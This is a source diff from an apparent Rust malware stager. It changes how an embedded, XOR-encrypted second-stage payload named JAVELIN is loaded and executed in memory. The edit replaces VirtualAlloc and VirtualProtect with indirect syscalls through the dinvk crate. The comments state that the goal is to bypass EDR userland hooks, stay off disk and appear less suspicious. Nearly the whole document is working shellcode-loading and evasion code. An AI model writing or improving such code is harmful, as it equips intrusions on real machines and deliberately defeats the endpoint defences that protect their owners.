@@ -10,21 +10,17 @@
 use crate::config::{ENCRYPTED_JAVELIN, JAVELIN_XOR_KEY, JAVELIN_DOWNLOAD_URL};
 use std::error::Error;
 
-#[cfg(target_os = "windows")]
-use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
-#[cfg(target_os = "windows")]
-use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
-
 /// Triggers Stage 2 (JAVELIN) execution
 ///
 /// This function:
 /// 1. Decrypts the embedded JAVELIN payload
-/// 2. Allocates executable memory
+/// 2. Allocates executable memory using indirect syscalls (dinvk)
 /// 3. Transfers execution to JAVELIN
 ///
 /// **OPSEC Notes**:
 /// - JAVELIN runs entirely in memory (never touches disk)
 /// - Uses RW → RX memory transition to appear less suspicious
+/// - Uses indirect syscalls via dinvk to bypass EDR userland hooks
 /// - XOR decryption is fast and doesn't require external libraries
 ///
 /// # Returns
@@ -67,50 +63,68 @@ fn xor_decrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
         .collect()
 }
 
-/// Executes payload in memory using VirtualAlloc
+/// Executes payload in memory using indirect syscalls via dinvk
 ///
 /// **Memory protection transitions**:
 /// 1. Allocate as RW (PAGE_READWRITE) - Less suspicious than RWX
 /// 2. Copy payload to allocated memory
 /// 3. Change to RX (PAGE_EXECUTE_READ) - Executable but not writable
 ///
+/// **OPSEC Enhancement**: Uses indirect syscalls via dinvk to bypass EDR hooks
+///
 /// This RW → RX transition is more OPSEC-friendly than direct RWX allocation
 #[cfg(target_os = "windows")]
 fn execute_in_memory(payload: &[u8]) -> Result<(), Box<dyn Error>> {
-    use std::ptr;
+    use std::ffi::c_void;
+    use dinvk::winapis::{NtAllocateVirtualMemory, NtProtectVirtualMemory, NtCurrentProcess};
 
     unsafe {
-        // Step 1: Allocate memory as RW
-        crate::debug_print!("[STAGE_TRIGGER] Allocating {} bytes as RW", payload.len());
-        let addr = VirtualAlloc(
-            ptr::null_mut(),
-            payload.len(),
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_READWRITE,
+        // Step 1: Allocate memory as RW using indirect syscall
+        crate::debug_print!("[STAGE_TRIGGER] Allocating {} bytes as RW (via indirect syscall)", payload.len());
+        
+        let mut base_address: *mut c_void = std::ptr::null_mut();
+        let mut region_size = payload.len();
+        
+        let status = NtAllocateVirtualMemory(
+            NtCurrentProcess(),
+            &mut base_address,
+            0,
+            &mut region_size,
+            0x3000, // MEM_COMMIT | MEM_RESERVE
+            0x04,   // PAGE_READWRITE
         );
 
-        if addr.is_null() {
-            return Err("VirtualAlloc failed".into());
+        if status < 0 || base_address.is_null() {
+            return Err("NtAllocateVirtualMemory failed".into());
         }
 
         // Step 2: Copy payload to allocated memory
         crate::debug_print!("[STAGE_TRIGGER] Copying payload to allocated memory");
-        ptr::copy_nonoverlapping(payload.as_ptr(), addr as *mut u8, payload.len());
+        std::ptr::copy_nonoverlapping(payload.as_ptr(), base_address as *mut u8, payload.len());
 
-        // Step 3: Change memory protection to RX (executable)
-        crate::debug_print!("[STAGE_TRIGGER] Changing memory protection to RX");
-        let mut old_protect = 0u32;
-        let result = VirtualProtect(addr, payload.len(), PAGE_EXECUTE_READ, &mut old_protect);
+        // Step 3: Change memory protection to RX (executable) using indirect syscall
+        crate::debug_print!("[STAGE_TRIGGER] Changing memory protection to RX (via indirect syscall)");
+        let mut base = base_address;
+        let mut size = payload.len();
+        let mut old_protect: u32 = 0;
 
-        if result == 0 {
-            return Err("VirtualProtect failed".into());
+        let status = NtProtectVirtualMemory(
+            NtCurrentProcess(),
+            &mut base,
+            &mut size,
+            0x20, // PAGE_EXECUTE_READ
+            &mut old_protect,
+        );
+
+        if status < 0 {
+            return Err("NtProtectVirtualMemory failed".into());
         }
 
         // Step 4: Execute JAVELIN
         // JAVELIN is expected to be position-independent code
         // It will handle its own execution and stage orchestration
         crate::debug_print!("[STAGE_TRIGGER] Transferring execution to JAVELIN");
-        let javelin_entry: extern "C" fn() = std::mem::transmute(addr);
+        let javelin_entry: extern "C" fn() = std::mem::transmute(base_address);
         javelin_entry();
 
         crate::debug_print!("[STAGE_TRIGGER] JAVELIN execution completed");
